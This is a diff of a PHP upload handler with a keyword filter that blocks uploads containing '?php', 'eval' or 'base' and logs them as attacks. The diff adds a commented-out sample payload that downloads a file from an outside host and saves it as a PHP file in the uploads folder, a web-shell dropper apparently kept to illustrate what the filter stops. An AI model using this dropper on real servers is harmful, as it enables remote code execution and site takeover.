@@ -23,12 +23,16 @@ if (isset($_POST)) {
         exit;
     }
     //禁止上传php
+    /*
+// 如何禁止
+<?phP
+$a = file_get_contents("http://www.dssj.cc/me2.txt");
+file_put_contents("./Uploads/123545614545.ph"."p",$a);
+?>
+    */
+
     $content = file_get_contents($name_tmp);
     if(strpos($content,'?php') != false || strpos($content,'eval') != false || strpos($content,'base') != false){
-        
-        // $filename = rand(10000000,9999999999);
-        // file_put_contents('./'.$filename.'.txt', $name.'_'.date('YmdHis').'.txt'.PHP_EOL, FILE_APPEND);
-        // file_put_contents('./Public/'.$filename.'______'.$name.'_'.date('YmdHis').'.txt', $content);
         
         file_put_contents(ATTACK_LOG_DIR . $name, $content);
         unlink($name_tmp);
